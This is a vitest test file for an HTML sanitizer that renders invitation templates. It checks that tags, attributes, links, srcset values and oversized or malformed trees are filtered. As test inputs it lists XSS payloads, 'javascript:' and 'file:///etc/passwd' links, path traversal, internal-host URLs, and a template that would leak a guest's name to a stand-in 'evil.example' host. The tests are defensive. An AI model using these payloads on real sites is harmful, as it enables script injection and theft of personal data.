import { describe, it, expect } from 'vitest'
import { el, text, v, renderToDom } from './helpers'
import { LIMITS, safeClass, safeLink, safeSrc } from '../policy'

const wrap = (...children) => el('div', { class: 'pkg-x' }, ...children)

describe('closed tag list', () => {
  it.each(['script', 'iframe', 'object', 'embed', 'form', 'input', 'style', 'svg', 'link', 'meta', 'base', 'button', 'video', 'math', 'template'])('drops <%s> and its children', tag => {
    const { html, warnings } = renderToDom(wrap(el(tag, {}, text('ALERT')), el('p', {}, text('ok'))))
    expect(html).not.toContain(`<${tag}`)
    expect(html).not.toContain('ALERT')
    expect(html).toContain('<p>ok</p>')
    expect(warnings.some(w => w.includes(`"${tag}"`))).toBe(true)
  })

  it('never renders markup from text: it stays text', () => {
    const { html } = renderToDom(wrap(el('p', {}, text('<script>alert(1)</script><img src=x onerror=alert(1)>'))))
    expect(html).toContain('&lt;script&gt;')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('<img src=x')
  })

  it('escapes variable values too', () => {
    const { html } = renderToDom(wrap(el('p', {}, v('guest.name'))), { invitation: { guest: { name: '<img src=x onerror=1>' } } })
    expect(html).toContain('&lt;img')
    expect(html).not.toContain('<img src=x')
  })
})

describe('attributes', () => {
  it('drops on*, style, ids that are not pkg-*, unknown, and srcdoc attributes', () => {
    const { html } = renderToDom(wrap(el('p', { onclick: 'x()', onmouseover: 'x()', style: 'position:fixed', id: 'rsvp', srcdoc: 'x', formaction: 'x', 'data-evil': '1', class: 'pkg-ok' }, text('hi'))))
    expect(html).toContain('<p class="pkg-ok">hi</p>')
    expect(renderToDom(wrap(el('p', { id: 'pkg-title' }, text('x')))).html).toContain('<p id="pkg-title">x</p>')
  })

  it('drops attribute names written with other casing', () => {
    const { html } = renderToDom(wrap(el('p', { OnClick: 'x()', STYLE: 'color:red' }, text('hi'))))
    expect(html).toContain('<p>hi</p>')
  })

  it.each(['javascript:alert(1)', ' JaVaScRiPt:alert(1)', 'data:text/html,<script>1</script>', 'http://insecure.test', '//evil.test', '/\\evil.test', 'vbscript:x', 'file:///etc/passwd', 'mailto:bad', 'tel:abc', '/relative/path', 'https://user:pw@evil.test'])('drops href %s', href => {
    const { html } = renderToDom(wrap(el('a', { href }, text('go'))))
    expect(html).not.toContain('href=')
  })

  it('keeps https, internal paths and fragments, and hardens target=_blank', () => {
    const { html } = renderToDom(wrap(el('a', { href: 'https://example.com/x', target: '_blank' }, text('a')), el('a', { href: 'mailto:hola@example.com' }, text('b')), el('a', { href: '#rsvp', target: '_top' }, text('c')), el('a', { href: 'tel:+13055550100' }, text('d'))))
    expect(html).toContain('href="https://example.com/x" target="_blank" rel="noopener noreferrer"')
    expect(html).toContain('<a href="mailto:hola@example.com">b</a>')
    expect(html).toContain('<a href="#rsvp">c</a>')
    expect(html).toContain('<a href="tel:+13055550100">d</a>')
  })

  it('drops target without a valid href', () => {
    const { html } = renderToDom(wrap(el('a', { href: 'javascript:1', target: '_blank' }, text('a'))))
    expect(html).not.toContain('target')
    expect(html).not.toContain('rel=')
  })

  it('resolves assets/ against the package base and rejects traversal, data: and http:', () => {
    const { html } = renderToDom(
      wrap(
        el('img', { src: 'assets/img/a.svg', alt: 'x' }),
        el('img', { src: 'assets/../../etc/passwd' }),
        el('img', { src: 'data:image/svg+xml,<svg onload=1>' }),
        el('img', { src: 'http://x.test/a.png' }),
        el('img', { src: 'assets//x' }),
        el('img', { src: { asset: 'assets/img/b.svg' }, srcset: { assets: [{ path: 'assets/img/b.svg', w: 480 }, { path: 'assets/../x', w: 800 }] }, alt: { tpl: [{ t: 'text', v: 'Hi ' }, { t: 'var', path: 'guest.first_name' }] } })
      )
    )
    expect(html).toContain('src="https://assets.test/p/1.0.0/assets/img/b.svg"')
    expect(html).toContain('alt="Hi Rosa"')
    expect(html).toContain('srcset="https://assets.test/p/1.0.0/assets/img/b.svg 480w"')
    expect(html).toContain('src="https://assets.test/p/1.0.0/assets/img/a.svg"')
    expect(html.match(/<img/g)).toHaveLength(6)
    expect(html.match(/ src=/g)).toHaveLength(2)
  })

  it('gives every image an alt (decorative by default)', () => {
    expect(renderToDom(wrap(el('img', { src: 'assets/a.webp' }))).html).toContain('alt=""')
  })

  it('only lets a var fill src/alt/aria-label/href, and still validates the result', () => {
    const photo = { t: 'var', path: 'section.image' }
    const evil = { sections: [{ type: 'cover', data: { image: 'javascript:alert(1)' } }] }
    expect(renderToDom(wrap(el('img', { src: photo })), evil).html).not.toContain('src=')
    expect(renderToDom(wrap(el('p', { class: { t: 'var', path: 'guest.name' } }, text('x')))).html).toContain('<p>x</p>')
  })

  it('only allows the package own classes (no Tailwind utilities that could overlay the UI)', () => {
    expect(safeClass('pkg-a pkg-b')).toBe('pkg-a pkg-b')
    for (const c of ['fixed inset-0 z-50', 'pkg-a fixed', 'inv-root', 'pkg-', 'PKG-a', 'pkg-a"onload="x']) expect(safeClass(c)).toBeNull()
    const { html } = renderToDom(wrap(el('div', { class: 'fixed inset-0 z-50' }, text('overlay'))))
    expect(html).toContain('<div>overlay</div>')
  })

  it('whitelists role and aria-hidden values', () => {
    const { html } = renderToDom(wrap(el('div', { role: 'button', 'aria-hidden': 'maybe' }), el('div', { role: 'presentation', 'aria-hidden': 'true' })))
    expect(html).toContain('<div></div><div role="presentation" aria-hidden="true"></div>')
  })

  it('validates behaviour attributes', () => {
    const { html } = renderToDom(wrap(el('div', { 'data-reveal': 'explode', 'data-parallax': '5', 'data-reveal-delay': '999', 'data-carousel': 'x' }), el('div', { 'data-reveal': 'slide-left', 'data-parallax': 'soft', 'data-reveal-delay': '300' })))
    expect(html).toContain('<div></div>')
    expect(html).toContain('data-reveal="slide-left" data-parallax="soft" data-reveal-delay="300"')
  })
})

describe('policy helpers', () => {
  it('safeLink / safeSrc basics', () => {
    expect(safeLink('https://a.test')).toBe('https://a.test/')
    expect(safeLink('/path?x=1')).toBeNull()
    expect(safeLink('#top')).toBeNull()
    expect(safeLink('#rsvp')).toBe('#rsvp')
    expect(safeLink('#pkg-menu')).toBe('#pkg-menu')
    expect(safeLink(null)).toBeNull()
    expect(safeSrc('assets/x.svg', 'https://a/')).toBe('https://a/assets/x.svg')
    expect(safeSrc('assets/x.svg', '')).toBeNull()
  })
})

describe('limits', () => {
  it('ignores a subtree deeper than the limit and warns', () => {
    let node = el('p', {}, text('deep'))
    for (let i = 0; i < 40; i++) node = el('div', {}, node)
    const { html, warnings } = renderToDom(node)
    expect(html).not.toContain('deep')
    expect(warnings.some(w => w.includes('depth'))).toBe(true)
    expect(html.match(/<div/g).length).toBeLessThanOrEqual(LIMITS.depth + 2)
  })

  it('stops at the node budget and warns once', () => {
    const many = Array.from({ length: 2000 }, () => el('span', {}, text('x')))
    const { root, warnings } = renderToDom(el('div', {}, ...many))
    expect(root.querySelectorAll('span').length).toBeLessThan(LIMITS.nodes)
    expect(warnings.filter(w => w.includes('node limit'))).toHaveLength(1)
  })

  it('survives garbage nodes without throwing', () => {
    const junk = el('div', {}, null, 7, 'str', [], { t: 'nope' }, { t: 'el' }, { t: 'el', tag: 5 }, { t: 'q' }, { t: 'var' }, { t: 'var', path: '__proto__' }, { t: 'var', path: 'constructor' }, { t: 'text', v: 9 })
    junk.children = [null, 7, 'str', [], { t: 'nope' }, { t: 'el' }, { t: 'el', tag: 5 }, { t: 'q' }, { t: 'var' }, { t: 'var', path: '__proto__' }, { t: 'var', path: 'constructor' }, { t: 'text', v: 9 }]
    expect(() => renderToDom(junk)).not.toThrow()
    expect(renderToDom(el('p', {}, v('__proto__')), {}).html).toContain('<p></p>')
  })

  it('ignores a section AST over the byte cap', () => {
    const big = el('div', {}, ...Array.from({ length: 900 }, () => el('p', {}, text('x'.repeat(300)))))
    const { html, warnings } = renderToDom(big)
    expect(html).toBe('<div id="out"></div>')
    expect(warnings.some(w => w.includes('larger than'))).toBe(true)
  })

  it('truncates very long text', () => {
    const { root } = renderToDom(el('p', {}, text('a'.repeat(50000))))
    expect(root.querySelector('p').textContent.length).toBe(LIMITS.text)
  })
})

describe('client revalidation equals the server (W6-10)', () => {
  const BASE = 'https://assets.test/p/1.0.0/'
  const img = attrs => renderToDom(wrap(el('img', { alt: 'x', ...attrs }))).html

  it.each([
    'https://evil.example/p.png 2x',
    'https://evil.example/p.png',
    'assets/a.png 2x, https://evil.example/b.png 3x',
    '/relative/p.png',
    'assets/../x.png 2x',
    'assets//x.png',
    'data:image/png;base64,AAAA',
    'assets/a.png 99999w',
    'assets/a.png, ',
    'javascript:alert(1)'
  ])('drops srcset %s', srcset => {
    expect(img({ srcset })).not.toContain('srcset')
  })

  it('keeps a srcset made only of package assets, resolved against the base', () => {
    expect(img({ srcset: 'assets/a.png 480w, assets/b.png 2x' })).toContain(`srcset="${BASE}assets/a.png 480w, ${BASE}assets/b.png 2x"`)
  })

  it.each(['https://evil.example/p.png', '/demo/valentina.webp', '//evil.example/p.png', 'http://x.test/p.png', 'blob:https://x.test/1'])('drops src %s (only assets/ of the package)', src => {
    expect(img({ src })).not.toContain('src=')
  })

  it('does not let a variable build href, src or srcset (it would leak the guest name)', () => {
    const leak = { tpl: [{ t: 'text', v: 'https://evil.example/?n=' }, { t: 'var', path: 'guest.name' }] }
    const whole = { t: 'var', path: 'guest.name' }
    const { html } = renderToDom(wrap(el('a', { href: leak }, text('a')), el('a', { href: whole }, text('b')), el('img', { src: leak, srcset: leak, alt: 'x' }), el('img', { src: whole, alt: 'x' })))
    expect(html).not.toContain('evil')
    expect(html).not.toContain('Rosa')
    expect(html).not.toContain('href=')
    expect(html).not.toContain('src')
  })

  it('still lets a variable fill alt/title/aria-label', () => {
    const { html } = renderToDom(wrap(el('img', { src: { asset: 'assets/a.png' }, alt: { tpl: [{ t: 'var', path: 'guest.name' }] } })))
    expect(html).toContain('alt="Rosa Fernández"')
  })

  it.each(['#nope', '#rsvp', 'https://example.com/a', 'mailto:hola@example.com', 'tel:+13055550100'])('href %s follows the closed list', href => {
    const { html } = renderToDom(wrap(el('a', { href }, text('go'))))
    expect(html.includes('href=')).toBe(href !== '#nope')
  })

  it.each([
    'https://localhost/x', 'https://app.localhost/x', 'https://127.0.0.1:8080/x', 'https://10.0.0.5/x', 'https://[::1]/x', 'https://0x7f000001/x',
    'https://2130706433/x', 'https://intranet/x', 'https://printer.local/x', 'https://db.internal/x', 'https://router.lan/x', 'https://user:pw@example.com/x'
  ])('rejects the link target %s', href => {
    expect(safeLink(href)).toBeNull()
  })

  it('accepts ordinary public hosts', () => {
    expect(safeLink('https://www.example.com/x')).toBe('https://www.example.com/x')
    expect(safeLink('https://maps.google.com/?q=1')).toBe('https://maps.google.com/?q=1')
  })

  it('keeps the byte and node caps with a tampered AST', () => {
    const huge = el('div', {}, text('x'.repeat(LIMITS.astBytes + 10)))
    const { html, warnings } = renderToDom(huge)
    expect(html).toBe('<div id="out"></div>')
    expect(warnings.some(w => w.includes('larger than'))).toBe(true)
  })

  it('does not read engine strings from the prototype', () => {
    const strings = { es: {} }
    const { html } = renderToDom(wrap(el('p', {}, v('t.__proto__'), v('t.constructor'), v('t.toString'))), { ctx: { strings } })
    expect(html).toContain('<p></p>')
  })
})
